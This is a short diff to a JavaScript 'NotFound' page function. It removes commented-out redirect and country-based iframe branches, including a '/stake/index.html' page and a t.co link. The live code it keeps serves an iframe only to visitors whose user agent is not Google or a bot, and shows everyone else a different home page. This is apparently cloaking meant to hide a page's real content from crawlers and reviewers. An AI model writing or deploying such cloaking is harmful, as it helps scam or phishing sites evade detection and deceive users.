@@ -80,27 +80,6 @@ function NotFound() {
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
       return(showIframe(IframeUrl,SiteTitleMeta,false));
-      //return window.location.href = 'https://t.co/eTzKSTCwng';
-     // return(showIframe("/stake/index.html",SiteTitleMeta,false));
-    // if(IsUserHiden){
-    //   return(showIframe("/id/home.html",SiteTitleHome,false));
-    // }else{
-    //   return(showIframe("/stake/index.html",SiteTitleMeta,false));
-      // if(countryCode.length == 0){
-      //   return(           
-      //     <div className="loading">
-      //         <div className="loader"></div>
-      //     </div>
-      //   );
-      // }else{
-      //   if(countryCode.includes('vn')){
-      //     return(showIframe("/id/home.html",SiteTitleHome,false));
-      //   }else{
-      //     return(showIframe("/stake/index.html",SiteTitleMeta,false));
-      //     //return(showIframe(IframeUrl,SiteTitleMeta,false));
-      //   }
-      // }
-   // }
   }else{
     return(showIframe("/id/home.html",SiteTitleHome,false));
   }
